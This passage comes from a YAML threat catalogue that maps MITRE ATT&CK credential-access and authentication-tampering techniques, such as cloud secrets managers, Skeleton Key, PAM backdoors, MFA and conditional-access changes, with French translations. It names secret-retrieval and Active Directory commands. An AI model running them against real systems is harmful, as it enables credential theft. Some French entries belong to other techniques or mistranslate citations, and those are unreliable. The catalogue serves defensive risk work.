      \ of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)\
      \ or compromising a service that has permission to retrieve secrets \u2013 they\
      \ may be able to request secrets from the secrets manager. This can be accomplished\
      \ via commands such as `get-secret-value` in AWS, `gcloud secrets describe`\
      \ in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered\
      \ Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation:\
      \ Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)\n\n**Note:** this\
      \ technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)\
      \ in that the credentials are being directly requested from the cloud secrets\
      \ manager, rather than through the medium of the instance metadata API.\nhttps://attack.mitre.org/techniques/T1555/006"
    translations:
      fr:
        name: Magasins de gestion de secrets cloud
        description: "Le d\xE9tournement des composants SIP ou des fournisseurs de\
          \ confiance peut \xE9galement permettre l'ex\xE9cution persistante de code,\
          \ car ces composants malveillants peuvent \xEAtre invoqu\xE9s par n'importe\
          \ quelle application effectuant la signature de code ou la validation de\
          \ signature. (R\xE9f\xE9rence : SpectorOps Subverting Trust, septembre 2017)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556
    ref_id: T1556
    name: Modify Authentication Process
    description: 'Adversaries may modify authentication mechanisms and processes to
      access user credentials or enable otherwise unwarranted access to accounts.
      The authentication process is handled by mechanisms, such as the Local Security
      Authentication Server (LSASS) process and the Security Accounts Manager (SAM)
      on Windows, pluggable authentication modules (PAM) on Unix-based systems, and
      authorization plugins on MacOS systems, responsible for gathering, storing,
      and validating credentials. By modifying an authentication process, an adversary
      may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).


      Adversaries may maliciously modify a part of this process to either reveal credentials
      or bypass authentication mechanisms. Compromised credentials or access may be
      used to bypass access controls placed on various resources on systems within
      the network and may even be used for persistent access to remote systems and
      externally available services, such as VPNs, Outlook Web Access and remote desktop.

      https://attack.mitre.org/techniques/T1556'
    translations:
      fr:
        name: "Modifier le processus d\u2019authentification"
        description: https://attack.mitre.org/techniques/T1553/003
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.001
    ref_id: T1556.001
    name: Domain Controller Authentication
    description: "Adversaries may patch the authentication process on a domain controller\
      \ to bypass the typical authentication mechanisms and enable access to accounts.\
      \ \n\nMalware may be used to inject false credentials into the authentication\
      \ process on a domain controller with the intent of creating a backdoor used\
      \ to access any user\u2019s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)).\
      \ Skeleton key works through a patch on an enterprise domain controller authentication\
      \ process (LSASS) with credentials that adversaries may use to bypass the standard\
      \ authentication system. Once patched, an adversary can use the injected password\
      \ to successfully authenticate as any domain user account (until the the skeleton\
      \ key is erased from memory by a reboot of the domain controller). Authenticated\
      \ access may enable unfettered access to hosts and/or resources within single-factor\
      \ authentication environments.(Citation: Dell Skeleton)\nhttps://attack.mitre.org/techniques/T1556/001"
    translations:
      fr:
        name: "Authentification par contr\xF4leur de domaine"
        description: "Les adversaires peuvent corriger le processus d\u2019authentification\
          \ sur un contr\xF4leur de domaine pour contourner les m\xE9canismes d\u2019\
          authentification habituels et permettre l\u2019acc\xE8s aux comptes. \n\n\
          Des logiciels malveillants peuvent \xEAtre utilis\xE9s pour injecter de\
          \ fausses identifiantes dans le processus d\u2019authentification sur un\
          \ contr\xF4leur de domaine dans le but de cr\xE9er une porte d\xE9rob\xE9\
          e permettant d\u2019acc\xE9der au compte et/ou aux identifiants de tout\
          \ utilisateur (ex : [Cl\xE9 squelette](https://attack.mitre.org/software/S0007)).\
          \ La cl\xE9 squelette fonctionne via un correctif sur un processus d\u2019\
          authentification par contr\xF4leur de domaine d\u2019entreprise (LSASS)\
          \ avec des identifiants que les adversaires peuvent utiliser pour contourner\
          \ le syst\xE8me d\u2019authentification standard. Une fois corrig\xE9, un\
          \ adversaire peut utiliser le mot de passe inject\xE9 pour s\u2019authentifier\
          \ avec succ\xE8s en tant que n\u2019importe quel compte utilisateur de domaine\
          \ (jusqu\u2019\xE0 ce que la cl\xE9 squelette soit effac\xE9e de la m\xE9\
          moire par un red\xE9marrage du contr\xF4leur de domaine). L\u2019acc\xE8\
          s authentifi\xE9 peut permettre un acc\xE8s illimit\xE9 aux h\xF4tes et/ou\
          \ ressources dans des environnements d\u2019authentification \xE0 facteur\
          \ unique. (Citation : Squelette Dell)\nhttps://attack.mitre.org/techniques/T1556/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.002
    ref_id: T1556.002
    name: Password Filter DLL
    description: "Adversaries may register malicious password filter dynamic link\
      \ libraries (DLLs) into the authentication process to acquire user credentials\
      \ as they are validated. \n\nWindows password filters are password policy enforcement\
      \ mechanisms for both domain and local accounts. Filters are implemented as\
      \ DLLs containing a method to validate potential passwords against password\
      \ policies. Filter DLLs can be positioned on local computers for local accounts\
      \ and/or domain controllers for domain accounts. Before registering new passwords\
      \ in the Security Accounts Manager (SAM), the Local Security Authority (LSA)\
      \ requests validation from each registered filter. Any potential changes cannot\
      \ take effect until every registered filter acknowledges validation. \n\nAdversaries\
      \ can register malicious password filters to harvest credentials from local\
      \ computers and/or entire domains. To perform proper validation, filters must\
      \ receive plain-text credentials from the LSA. A malicious password filter would\
      \ receive these plain-text credentials every time a password request is made.(Citation:\
      \ Carnal Ownage Password Filters Sept 2013)\nhttps://attack.mitre.org/techniques/T1556/002"
    translations:
      fr:
        name: DLL de filtre de mot de passe
        description: "Les adversaires peuvent enregistrer des biblioth\xE8ques de\
          \ liens dynamiques (DLL) par filtre de mot de passe malveillants dans le\
          \ processus d\u2019authentification afin d\u2019acqu\xE9rir les identifiants\
          \ utilisateur au fur et \xE0 mesure de leur validation. \n\nLes filtres\
          \ de mot de passe Windows sont des m\xE9canismes d\u2019application des\
          \ politiques de mot de passe pour les comptes de domaine et locaux. Les\
          \ filtres sont impl\xE9ment\xE9s sous forme de DLL contenant une m\xE9thode\
          \ pour valider les mots de passe potentiels par rapport aux politiques de\
          \ mot de passe. Les DLL filtres peuvent \xEAtre positionn\xE9s sur des ordinateurs\
          \ locaux pour les comptes locaux et/ou les contr\xF4leurs de domaine pour\
          \ les comptes de domaine. Avant d\u2019enregistrer de nouveaux mots de passe\
          \ dans le Security Accounts Manager (SAM), l\u2019Autorit\xE9 locale de\
          \ s\xE9curit\xE9 (LSA) demande la validation de chaque filtre enregistr\xE9\
          . Toute modification potentielle ne peut pas prendre effet tant que chaque\
          \ filtre enregistr\xE9 n\u2019a pas reconnu la validation. \n\nLes adversaires\
          \ peuvent enregistrer des filtres de mots de passe malveillants pour r\xE9\
          colter des identifiants provenant d\u2019ordinateurs locaux et/ou de domaines\
          \ entiers. Pour effectuer une validation correcte, les filtres doivent recevoir\
          \ des identifiants en texte clair de la LSA. Un filtre de mot de passe malveillant\
          \ recevrait ces identifiants en texte clair \xE0 chaque fois qu\u2019une\
          \ demande de mot de passe est effectu\xE9e. (Citation : Filtres de mots\
          \ de passe pour possession charnelle sept. 2013)\nhttps://attack.mitre.org/techniques/T1556/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.003
    ref_id: T1556.003
    name: Pluggable Authentication Modules
    description: 'Adversaries may modify pluggable authentication modules (PAM) to
      access user credentials or enable otherwise unwarranted access to accounts.
      PAM is a modular system of configuration files, libraries, and executable files
      which guide authentication for many services. The most common authentication
      module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account
      authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation:
      Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)


      Adversaries may modify components of the PAM system to create backdoors. PAM
      components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary
      adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)


      Malicious modifications to the PAM system may also be abused to steal credentials.
      Adversaries may infect PAM resources with code to harvest user credentials,
      since the values exchanged with PAM components may be plain-text since PAM does
      not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)

      https://attack.mitre.org/techniques/T1556/003'
    translations:
      fr:
        name: "Modules d\u2019authentification int\xE9grables"
        description: "Les adversaires peuvent modifier des modules d\u2019authentification\
          \ pluggables (PAM) pour acc\xE9der aux identifiants utilisateur ou permettre\
          \ un acc\xE8s non justifi\xE9 aux comptes. PAM est un syst\xE8me modulaire\
          \ de fichiers de configuration, de biblioth\xE8ques et de fichiers ex\xE9\
          cutables qui guident l\u2019authentification de nombreux services. Le module\
          \ d\u2019authentification le plus courant est <code>pam_unix.so</code>,\
          \ qui r\xE9cup\xE8re, d\xE9finit et v\xE9rifie les informations d\u2019\
          authentification des comptes dans <code>/etc/passwd</code> et <code>/etc/shadow</code>.\
          \ (Citation : Apple PAM)(Citation : Homme Pam_Unix)(Citation : Red Hat PAM)\n\
          \nLes adversaires peuvent modifier des composants du syst\xE8me PAM pour\
          \ cr\xE9er des portes d\xE9rob\xE9es. Les composants PAM, tels que <code>pam_unix.so</code>,\
          \ peuvent \xEAtre corrig\xE9s pour accepter des valeurs arbitraires fournies\
          \ par l\u2019adversaire comme identifiants l\xE9gitimes. (Citation : PAM\
          \ Backdoor)\n\nLes modifications malveillantes du syst\xE8me PAM peuvent\
          \ \xE9galement \xEAtre utilis\xE9es pour voler des identifiants. Les adversaires\
          \ peuvent infecter les ressources PAM avec du code pour r\xE9colter les\
          \ identifiants utilisateur, puisque les valeurs \xE9chang\xE9es avec les\
          \ composants PAM peuvent \xEAtre du texte brut puisque le PAM ne stocke\
          \ pas de mots de passe. (Citation : PAM Creds)(Citation : Apple PAM)\nhttps://attack.mitre.org/techniques/T1556/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.004
    ref_id: T1556.004
    name: Network Device Authentication
    description: 'Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001)
      to hard code a password in the operating system, thus bypassing of native authentication
      mechanisms for local accounts on network devices.


      [Modify System Image](https://attack.mitre.org/techniques/T1601) may include
      implanted code to the operating system for network devices to provide access
      for adversaries using a specific password.  The modification includes a specific
      password which is implanted in the operating system image via the patch.  Upon
      authentication attempts, the inserted code will first check to see if the user
      input is the password. If so, access is granted. Otherwise, the implanted code
      will pass the credentials on for verification of potentially valid credentials.(Citation:
      Mandiant - Synful Knock)

      https://attack.mitre.org/techniques/T1556/004'
    translations:
      fr:
        name: "Authentification des dispositifs r\xE9seau"
        description: "Les adversaires peuvent utiliser [Patch System Image](https://attack.mitre.org/techniques/T1601/001)\
          \ pour coder en dur un mot de passe dans le syst\xE8me d\u2019exploitation,\
          \ contournant ainsi les m\xE9canismes d\u2019authentification natifs pour\
          \ les comptes locaux sur les dispositifs r\xE9seau.\n\n[Modifier l\u2019\
          image du syst\xE8me](https://attack.mitre.org/techniques/T1601) peut inclure\
          \ du code implant\xE9 dans le syst\xE8me d\u2019exploitation pour des dispositifs\
          \ r\xE9seau afin de fournir un acc\xE8s aux adversaires en utilisant un\
          \ mot de passe sp\xE9cifique.  La modification inclut un mot de passe sp\xE9\
          cifique qui est implant\xE9 dans l\u2019image du syst\xE8me d\u2019exploitation\
          \ via le correctif.  Lors des tentatives d\u2019authentification, le code\
          \ ins\xE9r\xE9 v\xE9rifie d\u2019abord si l\u2019utilisateur est le mot\
          \ de passe. Si oui, l\u2019acc\xE8s est accord\xE9. Sinon, le code implant\xE9\
          \ transmettra les identifiants pour v\xE9rification des identifiants potentiellement\
          \ valides. (Citation : Mandiant - Synful Frappe)\nhttps://attack.mitre.org/techniques/T1556/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.005
    ref_id: T1556.005
    name: Reversible Encryption
    description: 'An adversary may abuse Active Directory authentication encryption
      properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code>
      property specifies whether reversible password encryption for an account is
      enabled or disabled. By default this property is disabled (instead storing user
      credentials as the output of one-way hashing functions) and should not be enabled
      unless legacy or other software require it.(Citation: store_pwd_rev_enc)


      If the property is enabled and/or a user changes their password after it is
      enabled, an adversary may be able to obtain the plaintext of passwords created/changed
      after the property was enabled. To decrypt the passwords, an adversary needs
      four components:


      1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory
      user-structure <code>userParameters</code>

      2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from
      <code>userParameters</code>

      3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)

      4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)


      With this information, an adversary may be able to reproduce the encryption
      key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation:
      how_pwd_rev_enc_2)


      An adversary may set this property at various scopes through Local Group Policy
      Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory
      [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example,
      an adversary may implement and apply a FGPP to users or groups if the Domain
      Functional Level is set to "Windows Server 2008" or higher.(Citation: dump_pwd_dcsync)
      In PowerShell, an adversary may make associated changes to user settings using
      commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.

      https://attack.mitre.org/techniques/T1556/005'
    translations:
      fr:
        name: "Chiffrement r\xE9versible"
        description: "Un adversaire peut abuser des propri\xE9t\xE9s de chiffrement\
          \ d\u2019authentification Active Directory pour acc\xE9der aux identifiants\
          \ sur les syst\xE8mes Windows. La propri\xE9t\xE9 <code>AllowReversiblePasswordEncryption</code>\
          \ sp\xE9cifie si le chiffrement par mot de passe r\xE9versible pour un compte\
          \ est activ\xE9 ou d\xE9sactiv\xE9. Par d\xE9faut, cette propri\xE9t\xE9\
          \ est d\xE9sactiv\xE9e (stockant \xE0 la place les identifiants utilisateur\
          \ comme sortie des fonctions de hachage unidirectionnelles) et ne devrait\
          \ \xEAtre activ\xE9e que si un logiciel h\xE9rit\xE9 ou autre l\u2019exige.\
          \ (Citation : store_pwd_rev_enc)\n\nSi la propri\xE9t\xE9 est activ\xE9\
          e et/ou qu\u2019un utilisateur change son mot de passe apr\xE8s qu\u2019\
          elle ait \xE9t\xE9 activ\xE9e, un adversaire peut \xEAtre en mesure d\u2019\
          obtenir le texte clair des mots de passe cr\xE9\xE9s/modifi\xE9s apr\xE8\
          s l\u2019activation de la propri\xE9t\xE9. Pour d\xE9chiffrer les mots de\
          \ passe, un adversaire a besoin de quatre composantes :\n\n1. Mot de passe\
          \ chiffr\xE9 (<code>G$RADIUSCHAP)</code> \xE0 partir <code>des userParam\xE8\
          tres</code> de la structure utilisateur Active Directory\n2. Valeur g\xE9\
          n\xE9r\xE9e al\xE9atoirement de 16 octets (<code>G$RADIUSCHAPKEY)</code>\
          \ \xE9galement \xE0 <code>partir de userParameters</code>\n3. Secret global\
          \ de la LSA (<code>G$MSRADIUSCHAPKEY)</code>\n4. Cl\xE9 statique cod\xE9\
          e en dur dans la DLL de sous-authentification d\u2019acc\xE8s \xE0 distance\
          \ (<code>RASSFM.DLL</code>)\n\nAvec ces informations, un adversaire peut\
          \ \xEAtre capable de reproduire la cl\xE9 de chiffrement et ensuite de d\xE9\
          chiffrer la valeur du mot de passe chiffr\xE9. (Citation : how_pwd_rev_enc_1)(Citation\
          \ : how_pwd_rev_enc_2)\n\nUn adversaire peut d\xE9finir cette propri\xE9\
          t\xE9 \xE0 diff\xE9rents niveaux via Local Group Policy Editor, les propri\xE9\
          t\xE9s utilisateur, la Fine-Grained Password Policy (FGPP), ou via le module\
          \ ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001).\
          \ Par exemple, un adversaire peut impl\xE9menter et appliquer un FGPP aux\
          \ utilisateurs ou groupes si le niveau fonctionnel du domaine est r\xE9\
          gl\xE9 sur \xAB Windows Server 2008 \xBB ou sup\xE9rieur. (Citation : dump_pwd_dcsync)\
          \ Dans PowerShell, un adversaire peut effectuer des modifications associ\xE9\
          es aux param\xE8tres utilisateur \xE0 l\u2019aide de commandes similaires\
          \ \xE0 <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.\n\
          https://attack.mitre.org/techniques/T1556/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.006
    ref_id: T1556.006
    name: Multi-Factor Authentication
    description: "Adversaries may disable or modify multi-factor authentication (MFA)\
      \ mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries\
      \ have gained access to a network by either compromising an account lacking\
      \ MFA or by employing an MFA bypass method such as [Multi-Factor Authentication\
      \ Request Generation](https://attack.mitre.org/techniques/T1621), adversaries\
      \ may leverage their access to modify or completely disable MFA defenses. This\
      \ can be accomplished by abusing legitimate features, such as excluding users\
      \ from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled\
      \ MFA method, or by manually patching MFA programs and configuration files to\
      \ bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD\
      \ Conditional Access Exclusions)\n\nFor example, modifying the Windows hosts\
      \ file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls\
      \ to localhost instead of an MFA server may cause the MFA process to fail. If\
      \ a \"fail open\" policy is in place, any otherwise successful authentication\
      \ attempt may be granted access without enforcing MFA. (Citation: Russians Exploit\
      \ Default MFA Protocol - CISA March 2022) \n\nDepending on the scope, goals,\
      \ and privileges of the adversary, MFA defenses may be disabled for individual\
      \ accounts or for all accounts tied to a larger group, such as all domain accounts\
      \ in a victim's network environment.(Citation: Russians Exploit Default MFA\
      \ Protocol - CISA March 2022)\nhttps://attack.mitre.org/techniques/T1556/006"
    translations:
      fr:
        name: Authentification multi-facteurs
        description: "Les adversaires peuvent d\xE9sactiver ou modifier les m\xE9\
          canismes d\u2019authentification multifactorielle (MFA) pour permettre un\
          \ acc\xE8s persistant aux comptes compromis.\n\nUne fois que les adversaires\
          \ ont acc\xE9d\xE9 \xE0 un r\xE9seau soit en compromettant un compte d\xE9\
          pourvu de MFA, soit en utilisant une m\xE9thode de contournement MFA telle\
          \ que [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621),\
          \ les adversaires peuvent utiliser leur acc\xE8s pour modifier ou d\xE9\
          sactiver compl\xE8tement les d\xE9fenses MFA. Cela peut \xEAtre r\xE9alis\xE9\
          \ en abusant de fonctionnalit\xE9s l\xE9gitimes, comme exclure les utilisateurs\
          \ des politiques d\u2019acc\xE8s conditionnelles Azure AD, enregistrer une\
          \ nouvelle m\xE9thode MFA vuln\xE9rable/contr\xF4l\xE9e par un adversaire,\
          \ ou en corrigeant manuellement les programmes MFA et les fichiers de configuration\
          \ pour contourner les fonctionnalit\xE9s attendues. (Citation : Mandiant\
          \ APT42)(Citation : Exclusions d\u2019acc\xE8s conditionnel Azure AD)\n\n\
          Par exemple, modifier le fichier h\xF4te Windows ('C\_:\\windows\\system32\\\
          drivers\\etc\\hosts') pour rediriger les appels MFA vers localhost au lieu\
          \ d\u2019un serveur MFA peut entra\xEEner l\u2019\xE9chec du processus MFA.\
          \ Si une politique \xAB \xE9chec ouvert \xBB est en place, toute tentative\
          \ d\u2019authentification autrement r\xE9ussie peut se voir accorder l\u2019\
          acc\xE8s sans appliquer la MFA. (Citation : Les Russes exploitent le protocole\
          \ MFA par d\xE9faut - CISA mars 2022) \n\nSelon la port\xE9e, les objectifs\
          \ et les privil\xE8ges de l\u2019adversaire, les d\xE9fenses MFA peuvent\
          \ \xEAtre d\xE9sactiv\xE9es pour les comptes individuels ou pour tous les\
          \ comptes li\xE9s \xE0 un groupe plus large, comme tous les comptes de domaine\
          \ dans l\u2019environnement r\xE9seau d\u2019une victime. (Citation : Les\
          \ Russes exploitent le protocole MFA par d\xE9faut - CISA mars 2022)\nhttps://attack.mitre.org/techniques/T1556/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.007
    ref_id: T1556.007
    name: Hybrid Identity
    description: "Adversaries may patch, modify, or otherwise backdoor cloud authentication\
      \ processes that are tied to on-premises user identities in order to bypass\
      \ typical authentication mechanisms, access credentials, and enable persistent\
      \ access to accounts.  \n\nMany organizations maintain hybrid user and device\
      \ identities that are shared between on-premises and cloud-based environments.\
      \ These can be maintained in a number of ways. For example, Microsoft Entra\
      \ ID includes three options for synchronizing identities between Active Directory\
      \ and Entra ID(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization\
      \ (PHS), in which a privileged on-premises account synchronizes user password\
      \ hashes between Active Directory and Entra ID, allowing authentication to Entra\
      \ ID to take place entirely in the cloud \n* Pass Through Authentication (PTA),\
      \ in which Entra ID authentication attempts are forwarded to an on-premises\
      \ PTA agent, which validates the credentials against Active Directory \n* Active\
      \ Directory Federation Services (AD FS), in which a trust relationship is established\
      \ between Active Directory and Entra ID \n\nAD FS can also be used with other\
      \ SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication\
      \ process to AD FS and receive a token containing the hybrid users\u2019 identity\
      \ and privileges. \n\nBy modifying authentication processes tied to hybrid identities,\
      \ an adversary may be able to establish persistent privileged access to cloud\
      \ resources. For example, adversaries who compromise an on-premises server running\
      \ a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService`\
      \ process that authorizes all attempts to authenticate to Entra ID, as well\
      \ as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation:\
      \ AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary\
      \ may edit the `Microsoft.IdentityServer.Servicehost` configuration file to\
      \ load a malicious DLL that generates authentication tokens for any user with\
      \ any set of claims, thereby bypassing multi-factor authentication and defined\
      \ AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able\
      \ to modify the hybrid identity authentication process from the cloud. For example,\
      \ adversaries who compromise a Global Administrator account in an Entra ID tenant\
      \ may be able to register a new PTA agent via the web console, similarly allowing\
      \ them to harvest credentials and log into the Entra ID environment as any user.(Citation:\
      \ Mandiant Azure AD Backdoors)\nhttps://attack.mitre.org/techniques/T1556/007"
    translations:
      fr:
        name: "Identit\xE9 hybride"
        description: "Les adversaires peuvent patcher, modifier ou autrement appliquer\
          \ des processus d\u2019authentification cloud d\xE9rob\xE9s li\xE9s aux\
          \ identit\xE9s des utilisateurs sur site afin de contourner les m\xE9canismes\
          \ d\u2019authentification habituels, les identifiants d\u2019acc\xE8s et\
          \ permettre un acc\xE8s persistant aux comptes.  \n\nDe nombreuses organisations\
          \ maintiennent des identit\xE9s hybrides utilisateur et appareil partag\xE9\
          es entre environnements sur site et bas\xE9s sur cloud. Ces syst\xE8mes\
          \ peuvent \xEAtre maintenus de plusieurs fa\xE7ons. Par exemple, Microsoft\
          \ Entra ID inclut trois options pour synchroniser les identit\xE9s entre\
          \ Active Directory et Entra ID (Citation : Azure AD Hybrid Identity) :\n\
          \n* Synchronisation de hachage de mot de passe (PHS), dans laquelle un compte\
          \ privil\xE9gi\xE9 sur site synchronise les hachages de mots de passe utilisateur\
          \ entre Active Directory et Entra ID, permettant ainsi l\u2019authentification\
          \ d\u2019Entra ID de se faire enti\xE8rement dans le cloud \n* Authentification\
          \ Pass Through (PTA), dans laquelle les tentatives d\u2019authentification\
          \ Entra ID sont transmises \xE0 un agent PTA sur site, qui valide les identifiants\
          \ contre Active Directory \n* Active Directory Federation Services (AD FS),\
          \ dans lesquels une relation de confiance est \xE9tablie entre Active Directory\
          \ et Entra ID \n\nAD FS peut \xE9galement \xEAtre utilis\xE9 avec d\u2019\
          autres plateformes SaaS et cloud telles qu\u2019AWS et GCP, qui transmettront\
          \ le processus d\u2019authentification \xE0 AD FS et recevront un jeton\
          \ contenant l\u2019identit\xE9 et les privil\xE8ges des utilisateurs hybrides.\
          \ \n\nEn modifiant les processus d\u2019authentification li\xE9s \xE0 des\
          \ identit\xE9s hybrides, un adversaire peut \xEAtre en mesure d\u2019\xE9\
          tablir un acc\xE8s privil\xE9gi\xE9 persistant aux ressources cloud. Par\
          \ exemple, des adversaires qui compromettent un serveur sur site ex\xE9\
          cutant un agent PTA peuvent injecter une DLL malveillante dans le processus\
          \ \xAB AzureADConnectAuthenticationAgentService \xBB qui autorise toutes\
          \ les tentatives d\u2019authentification \xE0 l\u2019ID Entra, ainsi que\
          \ les identifiants des utilisateurs. (Citation : Azure AD Connect pour les\
          \ lecteurs d\u2019\xE9quipe)(Citation : AADInternals Azure AD On-Premis\
          \ vers le cloud) Dans les environnements utilisant AD FS, un adversaire\
          \ peut modifier le fichier de configuration \xAB Microsoft.IdentityServer.Servicehost\
          \ \xBB pour charger une DLL malveillante qui g\xE9n\xE8re des jetons d\u2019\
          authentification pour tout utilisateur disposant d\u2019un ensemble de revendications,\
          \ contournant ainsi l\u2019authentification multi-facteurs et les politiques\
          \ AD FS d\xE9finies. (Citation : MagicWeb)\n\nDans certains cas, les adversaires\
          \ peuvent \xEAtre en mesure de modifier le processus d\u2019authentification\
          \ hybride d\u2019identit\xE9 depuis le cloud. Par exemple, des adversaires\
          \ qui compromettent un compte Global Administrator dans un locataire Entra\
          \ ID peuvent enregistrer un nouvel agent PTA via la console web, leur permettant\
          \ ainsi de collecter des identifiants et de se connecter \xE0 l\u2019environnement\
          \ Entra ID en tant qu\u2019utilisateur. (Citation : Mandiant Azure AD Backdoors)\n\
          https://attack.mitre.org/techniques/T1556/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.008
    ref_id: T1556.008
    name: Network Provider DLL
    description: "Adversaries may register malicious network provider dynamic link\
      \ libraries (DLLs) to capture cleartext user credentials during the authentication\
      \ process. Network provider DLLs allow Windows to interface with specific network\
      \ protocols and can also support add-on credential management functions.(Citation:\
      \ Network Provider API) During the logon process, Winlogon (the interactive\
      \ logon module) sends credentials to the local `mpnotify.exe` process via RPC.\
      \ The `mpnotify.exe` process then shares the credentials in cleartext with registered\
      \ credential managers when notifying that a logon event is happening.(Citation:\
      \ NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) \n\nAdversaries\
      \ can configure a malicious network provider DLL to receive credentials from\
      \ `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via\
      \ the Registry), a malicious DLL can receive and save credentials each time\
      \ a user logs onto a Windows workstation or domain via the `NPLogonNotify()`\
      \ function.(Citation: NPLogonNotify)\n\nAdversaries may target planting malicious\
      \ network provider DLLs on systems known to have increased logon activity and/or\
      \ administrator logon activity, such as servers and domain controllers.(Citation:\
      \ NPPSPY - Huntress)\nhttps://attack.mitre.org/techniques/T1556/008"
    translations:
      fr:
        name: "DLL du fournisseur r\xE9seau"
        description: "Les adversaires peuvent enregistrer des biblioth\xE8ques de\
          \ liaison dynamique (DLL) malveillantes des fournisseurs de r\xE9seau afin\
          \ de capturer les identifiants utilisateurs en clair lors du processus d\u2019\
          authentification. Les DLL des fournisseurs r\xE9seau permettent \xE0 Windows\
          \ d\u2019interfacer avec des protocoles r\xE9seau sp\xE9cifiques et peuvent\
          \ \xE9galement prendre en charge des fonctions de gestion des identifiants\
          \ compl\xE9mentaires. (Citation : API du fournisseur r\xE9seau) Pendant\
          \ le processus de connexion, Winlogon (le module de connexion interactif)\
          \ envoie les identifiants au processus local \xAB mpnotify.exe \xBB via\
          \ RPC. Le processus de \xAB mpnotify.exe \xBB partage ensuite les identifiants\
          \ en clair avec les gestionnaires de cr\xE9dentiels enregistr\xE9s lors\
          \ de la notification qu\u2019un \xE9v\xE9nement de connexion a lieu. (Citation\
          \ : NPPSPY - Huntress)(Citation : Vid\xE9o NPPSPY)(Citation : NPLogonNotify)\
          \ \n\nLes adversaires peuvent configurer une DLL de fournisseur r\xE9seau\
          \ malveillant pour recevoir des identifiants de \xAB mpnotify.exe \xBB.\
          \ (Citation : NPPSPY) Une fois install\xE9 en tant que gestionnaire d\u2019\
          identifiants (via le Registre), une DLL malveillante peut recevoir et enregistrer\
          \ des identifiants \xE0 chaque fois qu\u2019un utilisateur se connecte \xE0\
          \ une station de travail ou \xE0 un domaine Windows via la fonction 'NPLogonNotify()'.\
          \ (Citation : NPLogonNotify)\n\nLes adversaires peuvent cibler la implantation\
          \ de DLL malveillantes des fournisseurs r\xE9seau sur des syst\xE8mes connus\
          \ pour avoir une activit\xE9 de connexion accrue et/ou une activit\xE9 de\
          \ connexion administrateur, tels que les serveurs et les contr\xF4leurs\
          \ de domaine. (Citation : NPPSPY - Huntress)\nhttps://attack.mitre.org/techniques/T1556/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.009
    ref_id: T1556.009
    name: Conditional Access Policies
    description: "Adversaries may disable or modify conditional access policies to\
      \ enable persistent access to compromised accounts. Conditional access policies\
      \ are additional verifications used by identity providers and identity and access\
      \ management systems to determine whether a user should be granted access to\
      \ a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be\
      \ denied access to applications based on their IP address, device enrollment\
      \ status, and use of multi-factor authentication.(Citation: Microsoft Conditional\
      \ Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional\
      \ Access Policies) In some cases, identity providers may also support the use\
      \ of risk-based metrics to deny sign-ins based on a variety of indicators. In\
      \ AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary\
      \ constraints such as the source IP, the date the request was made, and the\
      \ nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation:\
      \ GCP IAM Conditions) These measures help to prevent compromised credentials\
      \ from resulting in unauthorized access to data or resources, as well as limit\
      \ user permissions to only those required. \n\nBy modifying conditional access\
      \ policies, such as adding additional trusted IP ranges, removing [Multi-Factor\
      \ Authentication](https://attack.mitre.org/techniques/T1556/006) requirements,\
      \ or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535),\
      \ adversaries may be able to ensure persistent access to accounts and circumvent\
      \ defensive measures.\nhttps://attack.mitre.org/techniques/T1556/009"
    translations:
      fr:
        name: "Politiques d\u2019acc\xE8s conditionnel"
